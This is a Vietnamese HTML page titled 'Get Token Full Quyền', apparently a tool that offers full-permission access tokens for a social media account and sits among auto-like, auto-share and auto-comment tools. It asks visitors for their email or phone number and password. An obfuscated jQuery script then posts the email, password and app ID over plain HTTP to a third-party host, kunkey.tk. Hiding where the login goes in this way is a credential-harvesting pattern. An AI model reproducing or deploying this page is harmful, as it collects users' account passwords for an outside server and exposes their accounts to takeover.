<!doctype html>
<!-- Code Được Viết Bởi Hoàng Minh Thuận-->
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script src="//code.jquery.com/jquery.min.js"></script>
<title>
  Get Token Full Quyền
</title> 
<link rel="stylesheet" type="text/css" href="http://bót.vn/curl/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
</head>
<body id="dashboard" class="background-dark template-product" >
  <div class="container" style="margin-top:30px">
  
 <center><div class="row">
                <hr />
            <div class="col-md-12">
                <ul class="nav nav-tabs">
                    <li><a href="/">Trang chủ</a></li>
                    <li><a href="/curl/share">Tools Auto Share</a></li>
                    <li><a href="/curl/like">Tools Auto Like</a></li>
					<li><a href="/curl/cmt">Tools Auto CMT</a></li>
					<li class="active"><a href="/curl/gettoken">GET Token Full Quyền</a></li>
       </ul>
</div> </center>
<br/>    
  
  
    <div class="row text-centered">
      <div class="col-md-12 text-center">
<div class="panel panel-primary">
<div class="panel-heading">
<h3 class="panel-title">Tool Lấy Token Full Quyền</h3>
</div>
<div class="panel-body">
<div class="form-group">
<label for="email">* Email hoặc số điện thoại :</label>
<input id="email" placeholder="Nhập Email" class="form-control"/>
</div>
<div class="form-group"><label for="password">* Mật khẩu :</label>
<input id="password" type="password" placeholder="Nhập Mật Khẩu" class="form-control"/>
</div>
<div class="form-group"><label for="app_id">* Chọn Ứng Dụng :</label>
<select id="app_id" class="form-control">
<option value="6628568379">Token Iphone</option>
<option value="350685531728">Token Android</option>
<option value="165907476854626">Token IOS</option>
</select>
</div>
<div class="form-group text-center">
<button id="submit" class="btn btn-sm btn-danger">Lấy Token Ngay</button>
</div>
<div class="form-group text-center" id="load_result" style="display:none">
<label for="result">Access Token của bạn là :</label>
<textarea id="result" onclick="this.focus();this.select()" class="form-control" rows="2"></textarea>
</div>
</div>
</div>
<script>
    var _0x6619 = ["click", "#submit", "disabled", "attr", "Đang lấy Token, vui lòng đợi...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Lấy token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "http://kunkey.tk/gettoken/full.php", "post", "ajax", "on"];
    $(document)[_0x6619[20]](_0x6619[0], _0x6619[1], function () {
        $(_0x6619[1])[_0x6619[3]](_0x6619[2], _0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[4]);
        var _0x1ea6x1 = $(_0x6619[7])[_0x6619[6]](),
            _0x1ea6x2 = $(_0x6619[8])[_0x6619[6]](),
            _0x1ea6x3 = $(_0x6619[9])[_0x6619[6]]();
        $[_0x6619[19]]({
            url: _0x6619[17],
            type: _0x6619[18],
            data: {
                email: _0x1ea6x1,
                password: _0x1ea6x2,
                app_id: _0x1ea6x3
            },
            success: function (_0x1ea6x1) {
                $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x1ea6x1)
            }
        })[_0x6619[16]](function () {
            $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x6619[14])
        })
    })
</script>
</div>
</div>
</div>
</body>
</html>
<?